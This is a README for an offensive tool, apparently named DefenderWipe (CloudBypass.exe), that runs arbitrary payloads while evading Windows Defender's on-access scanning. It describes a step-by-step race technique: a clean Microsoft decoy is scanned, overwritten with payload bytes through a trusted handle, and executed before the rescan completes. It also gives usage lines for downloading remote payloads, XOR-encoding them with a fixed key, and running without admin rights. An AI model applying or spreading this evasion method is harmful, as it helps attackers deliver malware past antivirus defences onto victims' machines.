# DefenderWipe

Executes a payload bypassing Windows Defender on-access scanning.

## How it works

1. Downloads or reads payload into memory
2. Drops a clean Microsoft binary as a decoy to temp
3. Scans the decoy through MpClient — Defender clears the path
4. Opens a trusted file handle on the cleared path
5. Overwrites the decoy with payload bytes through the trusted handle
6. Re-scans the path — Defender clears it again post-write
7. Executes from the cleared path before async rescan completes

## Usage

CloudBypass.exe <payload.exe>
CloudBypass.exe https://url/payload.dat


## Notes

- URL payloads must be XOR encoded with key 0xAB using extractor.bat
- Payload never touches disk as a named executable
- Works from standard user, no admin required
- Re-run if execution fails — timing dependent

## Files

- CloudBypass.exe — main bypass tool
- extractor.bat — drag and drop XOR encoder for URL delivery
